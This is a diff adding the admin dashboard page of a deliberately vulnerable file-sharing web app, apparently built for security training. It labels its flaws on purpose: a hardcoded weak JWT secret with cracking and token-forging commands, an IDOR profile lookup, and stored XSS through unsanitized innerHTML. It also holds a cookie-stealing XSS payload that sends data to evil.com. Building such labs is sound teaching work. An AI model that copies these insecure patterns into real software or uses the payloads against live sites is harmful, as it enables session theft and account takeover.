@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FileCloud — Admin Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
+  <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" type="text/css" href="css/util.css">
+  <link rel="stylesheet" type="text/css" href="css/main.css">
+  <style>
+    .container { max-width: 1000px; margin-top: 30px; }
+    .vuln-badge { font-size: 10px; }
+    .token-box { font-family: monospace; font-size: 11px; word-break: break-all;
+                 background: #f8f9fa; padding: 8px; border-radius: 4px; }
+  </style>
+</head>
+<body>
+
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+  <a class="navbar-brand" href="#">☁️ FileCloud Admin</a>
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item mr-3">
+      <span class="nav-link text-warning" id="adminName"></span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link btn btn-danger text-white px-3" href="/logout">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+<div class="container">
+
+  <!-- JWT Info -->
+  <div class="card mb-4 border-warning">
+    <div class="card-header bg-warning text-dark d-flex justify-content-between">
+      <strong>🔑 Admin JWT Token</strong>
+      <span class="badge badge-danger vuln-badge">⚠️ V2: Weak secret — brute-forceable</span>
+    </div>
+    <div class="card-body">
+      <div class="token-box" id="tokenDisplay">Loading...</div>
+      <small class="text-muted">
+        Secret: <code>secret123</code> — crack with: <code>hashcat -a 0 -m 16500 &lt;token&gt; wordlist.txt</code><br>
+        Forge admin token (alg:none): <code>python3 forge_token.py --user_id 3 --role admin</code>
+      </small>
+    </div>
+  </div>
+
+  <!-- Users Table -->
+  <div class="card mb-4">
+    <div class="card-header d-flex justify-content-between align-items-center">
+      <strong>👥 All Users</strong>
+      <span class="badge badge-info vuln-badge">⚠️ V3: IDOR — access via forged JWT user_id</span>
+    </div>
+    <div class="card-body p-0">
+      <table class="table table-bordered table-striped mb-0" id="userTable">
+        <thead class="thead-dark">
+          <tr>
+            <th>ID</th><th>Username</th><th>Role</th><th>Email</th>
+            <th>Files</th><th>Size (KB)</th><th>Action</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Activity Log — Stored XSS Surface -->
+  <div class="card mb-4 border-danger">
+    <div class="card-header bg-danger text-white d-flex justify-content-between">
+      <strong>📋 Activity Log</strong>
+      <span class="badge badge-light vuln-badge">⚠️ V10: Stored XSS — innerHTML rendering</span>
+    </div>
+    <div class="card-body" id="activityLog" style="max-height:300px;overflow-y:auto;">
+      <em>Loading...</em>
+    </div>
+    <div class="card-footer">
+      <small class="text-muted">
+        XSS PoC: <code>POST /activity</code> with action:
+        <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code>
+      </small>
+    </div>
+  </div>
+
+  <!-- Inject XSS Payload (demo) -->
+  <div class="card mb-4 border-warning">
+    <div class="card-header bg-warning text-dark">
+      <strong>💉 Inject Activity (XSS Demo)</strong>
+    </div>
+    <div class="card-body">
+      <div class="form-row">
+        <div class="col">
+          <input type="text" id="xssUsername" class="form-control form-control-sm" placeholder="Username" value="attacker">
+        </div>
+        <div class="col">
+          <input type="text" id="xssAction" class="form-control form-control-sm"
+            placeholder="Action / XSS payload"
+            value='<img src=x onerror="alert(document.cookie)">'>
+        </div>
+        <div class="col-auto">
+          <button class="btn btn-warning btn-sm" onclick="injectActivity()">Inject</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+async function init() {
+  const meRes = await fetch("/api/me");
+  if (!meRes.ok) { window.location.href = "/login.html"; return; }
+  const me = await meRes.json();
+  if (me.role !== "admin") { window.location.href = "/dashboard.html"; return; }
+  document.getElementById("adminName").textContent = `Admin: ${me.username}`;
+
+  const tokenRes = await fetch("/api/token");
+  if (tokenRes.ok) {
+    const { token } = await tokenRes.json();
+    document.getElementById("tokenDisplay").textContent = token;
+  }
+
+  loadUsers();
+  loadActivity();
+}
+
+async function loadUsers() {
+  const res = await fetch("/admin/users");
+  if (!res.ok) { alert("Access denied"); return; }
+  const users = await res.json();
+  const tbody = document.querySelector("#userTable tbody");
+  tbody.innerHTML = "";
+  users.forEach(u => {
+    const tr = document.createElement("tr");
+    tr.innerHTML = `
+      <td>${u.id}</td>
+      <td>${u.username}</td>
+      <td><span class="badge badge-${u.role==='admin'?'danger':'secondary'}">${u.role}</span></td>
+      <td>${u.email || ''}</td>
+      <td>${u.fileCount}</td>
+      <td>${u.totalSizeKB}</td>
+      <td>
+        <button class="btn btn-sm btn-outline-primary mr-1"
+          onclick="viewProfile(${u.id})">Profile</button>
+        <button class="btn btn-sm btn-danger"
+          onclick="deleteUser('${u.username}')">Delete</button>
+      </td>
+    `;
+    tbody.appendChild(tr);
+  });
+}
+
+async function viewProfile(userId) {
+  // VULN V3: IDOR — any user_id can be queried
+  const res = await fetch(`/api/profile/${userId}`);
+  const data = await res.json();
+  alert(JSON.stringify(data, null, 2));
+}
+
+async function deleteUser(username) {
+  if (!confirm(`Delete user ${username}?`)) return;
+  const res = await fetch("/admin/delete", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ targetUser: username })
+  });
+  const data = await res.json();
+  if (data.success) loadUsers();
+}
+
+async function loadActivity() {
+  const res = await fetch("/activity", { headers: { "x-role": "admin" } });
+  if (!res.ok) return;
+  const entries = await res.json();
+  const log = document.getElementById("activityLog");
+  log.innerHTML = "";
+  entries.forEach(e => {
+    const div = document.createElement("div");
+    div.className = "border-bottom py-1 small";
+    // VULN V10: innerHTML with unsanitized user input → Stored XSS
+    div.innerHTML = `<span class="text-muted">${e.ts}</span> — <strong>${e.username}</strong>: ${e.action}`;
+    log.appendChild(div);
+  });
+}
+
+async function injectActivity() {
+  const username = document.getElementById("xssUsername").value;
+  const action   = document.getElementById("xssAction").value;
+  await fetch("/activity", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username, action })
+  });
+  loadActivity();
+}
+
+init();
+</script>
+
+<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+<script src="vendor/bootstrap/js/popper.js"></script>
+<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+</body>
+</html>
